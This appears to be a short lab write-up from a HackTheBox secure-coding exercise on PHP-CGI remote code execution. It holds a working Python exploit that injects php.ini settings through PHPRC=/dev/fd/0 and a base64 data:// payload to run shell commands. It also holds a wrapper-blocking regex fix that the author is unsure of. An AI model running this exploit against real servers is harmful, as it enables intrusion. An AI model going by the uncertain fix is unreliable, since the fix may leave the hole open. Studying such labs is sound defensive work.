---
date: March 21, 2025
description: fixing some RCE in php cgi
platform: HackTheBox
categories: Secure Coding
tags:
---

#php-cgi #RCE #php 

# Vulnerability 


exploit.py
```python
#!/usr/bin/env python3

# Modules
import requests, base64, urllib.parse
URL = "http://127.0.0.1:8081"

payload = b'<? shell_exec("id > /www/application/out.txt"); ?>'
data_url = f"data://text/plain;base64,{base64.b64encode(payload).decode()}"
data = {
    "data":urllib.parse.quote(f"allow_url_include=1\nauto_prepend_file=\"{data_url}\"")
}

response = requests.post(f"{URL}/cgi-bin/app.cgi?PHPRC=/dev/fd/0", data=data)
print("[*] HTTP Status:", response.status_code)
response = requests.get(f"{URL}/out.txt")

if (response.status_code != 200):
    print("[-] Exploit failed!")
    exit()

print("[+] Data: ", response.text)
```

# Fix 
added add validation in index app.cgi file 
not enitrely sure if this fixes it but i just disabled some php wrappers 
```php
    if (preg_match('/^(https?|data|input|php|file|glob|phar|zip|zlib|compress):\/\//i', $data)) {
        echo "Failed to execute PHP with PHPRC: " . htmlspecialchars($phprc);
        exit;
    }
```

similar to the exploit https://www.exploit-db.com/exploits/18836 
